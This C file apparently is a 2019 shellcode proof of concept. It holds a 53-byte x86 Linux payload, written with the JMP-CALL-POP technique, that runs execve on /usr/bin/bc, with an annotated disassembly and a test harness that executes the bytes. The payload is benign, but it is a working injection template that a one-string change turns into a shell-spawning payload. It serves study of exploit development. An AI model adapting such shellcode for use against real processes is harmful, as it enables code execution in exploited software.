/*
; Date: 27/01/2019
; Execve_Calc.asm
; Author: Daniele Votta
; Description: This program invoke excve to run terminal calculator (bc).
; Tested on: i686 GNU/Linux
; Shellcode Length:53
; JMP | CALL | POP | Techniques
*/

#include<stdio.h>
#include<string.h>

/*
; Execve_Calc:     file format elf32-i386
;
; Disassembly of section .text:
; 08048080 <_start>:
; 8048080:	eb 1a                	jmp    804809c <call_shellcode>
;
; 08048082 <shellcode>:
; 8048082:	5e                   	pop    esi
; 8048083:	31 db                	xor    ebx,ebx
; 8048085:	88 5e 0b             	mov    BYTE PTR [esi+0xb],bl
; 8048088:	89 76 0c             	mov    DWORD PTR [esi+0xc],esi
; 804808b:	89 5e 10             	mov    DWORD PTR [esi+0x10],ebx
; 804808e:	8d 1e                	lea    ebx,[esi]
; 8048090:	8d 4e 0c             	lea    ecx,[esi+0xc]
; 8048093:	8d 56 10             	lea    edx,[esi+0x10]
; 8048096:	31 c0                	xor    eax,eax
; 8048098:	b0 0b                	mov    al,0xb
; 804809a:	cd 80                	int    0x80
;
; 0804809c <call_shellcode>:
; 804809c:	e8 e1 ff ff ff       	call   8048082 <shellcode>
;
; 080480a1 <message>:
; 80480a1:	2f                   	das
; 80480a2:	75 73                	jne    8048117 <_end+0x5f>
; 80480a4:	72 2f                	jb     80480d5 <_end+0x1d>
; 80480a6:	62 69 6e             	bound  ebp,QWORD PTR [ecx+0x6e]
; 80480a9:	2f                   	das
; 80480aa:	62 63 41             	bound  esp,QWORD PTR [ebx+0x41]
; 80480ad:	42                   	inc    edx
; 80480ae:	42                   	inc    edx
; 80480af:	42                   	inc    edx
; 80480b0:	42                   	inc    edx
; 80480b1:	43                   	inc    ebx
; 80480b2:	43                   	inc    ebx
; 80480b3:	43                   	inc    ebx
; 80480b4:	43                   	inc    ebx
======================= POC Daniele Votta =======================
*/

unsigned char shellcode[] = \
"\xeb\x1a\x5e\x31\xdb\x88\x5e\x0b\x89\x76\x0c\x89\x5e\x10\x8d\x1e\x8d\x4e\x0c\x8d\x56\x10\x31\xc0\xb0\x0b\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x62\x63\x41\x42\x42\x42\x42\x43\x43\x43\x43";

int main()
{
	printf("Shellcode Length:  %d\n", strlen(shellcode));
	int (*ret)() = (int(*)())shellcode;
	ret();
}